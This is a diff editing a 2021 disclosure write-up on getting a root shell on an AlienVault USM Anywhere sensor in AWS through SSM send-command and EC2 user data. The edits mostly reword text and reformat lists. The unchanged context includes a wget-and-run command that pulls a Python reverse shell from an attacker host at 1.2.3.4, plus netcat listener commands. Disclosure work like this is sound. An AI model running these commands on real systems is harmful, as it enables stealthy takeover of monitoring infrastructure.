@@ -1,6 +1,6 @@
 # Abstract
 
-This page discloses 2 ways to get a root shell on an [USM Anywhere sensor](https://cybersecurity.att.com/products/usm-anywhere) deployed on AWS. The first way is done through [AWS SSM](https://docs.aws.amazon.com/systems-manager/latest/userguide/ssm-agent.html), and the second one through [AWS EC2 user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html). The impact is to be able to modify the USM Anywhere sensor without limitation and undetected, making further exploitation of an AWS environment silently. Findings were tested using a [free trial](https://cybersecurity.att.com/products/usm-anywhere/free-trial), with the latest available version of USM Anywhere sensor as of 2021-05-04: version 6.0.205.
+This page discloses 2 ways to get a root shell on an [USM Anywhere sensor](https://cybersecurity.att.com/products/usm-anywhere) deployed on AWS. The first way is done through [AWS SSM](https://docs.aws.amazon.com/systems-manager/latest/userguide/ssm-agent.html), and the second one through [AWS EC2 user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html). The impact is to be able to modify the USM Anywhere sensor without any limitation and undetected, making further exploitation of an AWS environment silently. Findings were tested using a [free trial](https://cybersecurity.att.com/products/usm-anywhere/free-trial), with the latest available version of USM Anywhere sensor as of 2021-05-04: version 6.0.205.
 
 Those findings were not categorized as vulnerabilities by AlienVault. AlienVault reminded that it is the customer responsibility to secure AlienVault sensor deployed in AWS by following [AWS best practices](https://docs.aws.amazon.com/systems-manager/latest/userguide/security-best-practices.html).
 
@@ -34,18 +34,18 @@ For this attack to succeed, the attacker needs to have AWS credentials to a user
 ### Process
 The process is to:
 
-1. add the necessary permissions on the USM Anywhere instance role
+- add the necessary permissions on the USM Anywhere instance role
 
 ![ssm-permissions](./img/2021-05-04-root-alienvault-usm-sensor/ssm-permissions.png)
 
-2. wait few minutes for the SSM agent to come online. This step is optional and requires extra permissions to describe instances information.
+- wait a few minutes for the SSM agent to come online. This step is optional and requires extra permissions to describe instances information.
 
 ```
 $ aws ssm describe-instance-information --output text --query "InstanceInformationList[*]"
 3.0.529.0	USMA-Sensor	172.31.36.0	i-[instanceID]	False	1620139052.209	Online	Ubuntu	Linux	16.04	EC2Instance
 ```
 
-3. use SSM send-command to send reverse shell. For the reverse shell to work I used a python one, and distributed it from a python web server.
+- use SSM send-command to send reverse shell. For the reverse shell to work I used a python one, and distributed it from a python web server.
 
 ```
 $ cat lol.py
@@ -69,7 +69,7 @@ NOTIFICATIONCONFIG
 COMMANDS	wget -O /tmp/lol.py http://1.2.3.4:4444/lol.py ; sleep 10 ; python /tmp/lol.py &
 ```
 
-4. get the reverse shell
+- get the reverse shell
 
 ```
 $ nc -lvnp 4445
@@ -96,8 +96,8 @@ For this attack to succeed, the attacker needs to have AWS credentials to a user
 
 The process to leverage AWS EC2 user data to get a root shell is a bit more noisy than the SSM way: we need to stop and start the sensor instance.
 
-1. stop USM instance
-2. change user data from the original json string to a reverse shell
+- stop USM instance
+- change user data from the original json string to a reverse shell
 
 ```
 Content-Type: multipart/mixed; boundary="//"
@@ -124,13 +124,13 @@ Content-Disposition: attachment; filename="userdata.txt"
 --//
 ```
 
-3. start your netcat listener on the attacker controlled server, here `1.2.3.4`
+- start your netcat listener on the attacker controlled server, here `1.2.3.4`
 
 ```
 $ nc -lvnp 4444
 ```
 
-4. start instance and get your root shell
+- start instance and get your root shell
 
 ```
 $ nc -lvnp 4444
@@ -163,11 +163,11 @@ Since both ways rely on AWS APIs, specific rules can be written to detect it fro
 
 - [2021-01-05] emailed security mailing list and created support case, asking for point of contact
 - [2021-01-05] support case acknowledged and escalated, scheduling call
-- [2021-01-12] call scheduled, presented finding details, detection and mitigation ideas
-- [2021-02-01] case escalated to internal AlienVault ticket
-- [2021-03-01] reminder to AlienVault about the findings
-- [2021-03-25] reminder to AlienVault about the findings
-- [2021-04-15] call with AlienVault, exposing findings details
+- [2021-01-12] scheduled call, presented finding details, detection and mitigation ideas
+- [2021-02-01] escalated case to internal AlienVault ticket
+- [2021-03-01] sent reminder to AlienVault about the findings
+- [2021-03-25] sent reminder to AlienVault about the findings
+- [2021-04-15] scheduled call with AlienVault, exposing findings details
 - [2021-04-20] AlienVault answered classifiying this finding as not being a vulnerability
 
 Published on the 2021-05-04 by Pierre Gaulon.
